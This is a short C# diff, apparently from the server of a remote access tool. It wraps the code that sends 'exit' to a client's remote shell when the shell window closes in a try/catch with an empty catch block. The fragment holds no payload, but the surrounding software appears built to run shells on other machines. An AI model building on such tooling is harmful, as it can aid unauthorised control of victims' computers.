@@ -48,10 +48,14 @@ namespace Server.Forms
 
         private void FormShell_FormClosed(object sender, FormClosedEventArgs e)
         {
-            MsgPack msgpack = new MsgPack();
-            msgpack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
-            msgpack.ForcePathObject("WriteInput").AsString = "exit";
-            ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "shellWriteInput";
+                msgpack.ForcePathObject("WriteInput").AsString = "exit";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
+            }
+            catch {}            
         }
 
         private void Timer1_Tick(object sender, EventArgs e)
